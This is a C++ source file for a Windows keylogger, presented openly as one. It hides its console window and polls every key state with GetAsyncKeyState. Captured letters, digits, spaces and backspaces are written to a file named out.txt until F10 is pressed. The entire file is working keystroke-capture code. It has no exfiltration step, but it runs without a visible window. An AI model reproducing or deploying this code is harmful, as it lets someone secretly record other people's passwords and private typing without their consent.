// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Created by Jayson R.

//this define allows us to use 'unsafe' functions
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <WinUser.h>
#include <iostream>


void logger_loop()
{
    //save our 'console' output to a text file
    freopen("out.txt", "w", stdout);

    //our 'counter' to know when to print a new line
    uint64_t counter = 0;
    //beep twice to symbolize start
    Beep(600, 250);
    Beep(600, 250);
    while (true)
    {
        for (uint32_t cur_key = 0x00; cur_key < 0xFE; cur_key++)
        {
            bool held = false;
            char buffer = {};
            while (GetAsyncKeyState(cur_key))
            {
                if (held == false)
                {
                    held = true;
                    //probably a better idea to use ToAsciiEx here instead of a switch case -- meh
                    switch (cur_key)
                    {
                    case NULL:
                        //this is to stop keys not defined in this switch case from triggering false positives.
                        buffer = NULL;
                        counter = 0;
                        break;
                    case 0x08:
                        //this case is for the backspace keypress, moves the cursor back one space, then writes a space to erase the character.
                        std::cout << "\b \b";
                        break;
                    case 0x20:
                        //space keypress
                        buffer = ' ';
                        break;
                    case 0x30:
                        buffer = '0';
                        break;
                    case 0x31:
                        buffer = '1';
                        break;
                    case 0x32:
                        buffer = '2';
                        break;
                    case 0x33:
                        buffer = '3';
                        break;
                    case 0x34:
                        buffer = '4';
                        break;
                    case 0x35:
                        buffer = '5';
                        break;
                    case 0x36:
                        buffer = '6';
                        break;
                    case 0x37:
                        buffer = '7';
                        break;
                    case 0x38:
                        buffer = '8';
                        break;
                    case 0x39:
                        buffer = '9';
                        break;
                    case 0x41:
                        buffer = 'A';
                        break;
                    case 0x42:
                        buffer = 'B';
                        break;
                    case 0x43:
                        buffer = 'C';
                        break;
                    case 0x44:
                        buffer = 'D';
                        break;
                    case 0x45:
                        buffer = 'E';
                        break;
                    case 0x46:
                        buffer = 'F';
                        break;
                    case 0x47:
                        buffer = 'G';
                        break;
                    case 0x48:
                        buffer = 'H';
                        break;
                    case 0x49:
                        buffer = 'I';
                        break;
                    case 0x4A:
                        buffer = 'J';
                        break;
                    case 0x4B:
                        buffer = 'K';
                        break;
                    case 0x4C:
                        buffer = 'L';
                        break;
                    case 0x4D:
                        buffer = 'M';
                        break;
                    case 0x4E:
                        buffer = 'N';
                        break;
                    case 0x4F:
                        buffer = 'O';
                        break;
                    case 0x50:
                        buffer = 'P';
                        break;
                    case 0x51:
                        buffer = 'Q';
                        break;
                    case 0x52:
                        buffer = 'R';
                        break;
                    case 0x53:
                        buffer = 'S';
                        break;
                    case 0x54:
                        buffer = 'T';
                        break;
                    case 0x55:
                        buffer = 'U';
                        break;
                    case 0x56:
                        buffer = 'V';
                        break;
                    case 0x57:
                        buffer = 'W';
                        break;
                    case 0x58:
                        buffer = 'X';
                        break;
                    case 0x59:
                        buffer = 'Y';
                        break;
                    case 0x5A:
                        buffer = 'Z';
                        break;
                    case 0x79:
                        //this is for our 'exit' key, which is F10. this will return the loop and exit the program
                        Beep(400, 400);
                        return;
                    }
                    if (buffer != NULL)
                    {
                        std::cout << buffer;
                    }
                    else
                    {
                        counter = 0;
                    }
                }
            }
            held = false;
        }
        counter++;
        //periodically print out a new line in the console
        if (counter == 500)
        {
            std::cout << std::endl;
            counter = 0;
        }
        Sleep(10);
    }
}
int main()
{
    //free our console
    FreeConsole();
    //begin key listener loop
    logger_loop();
}
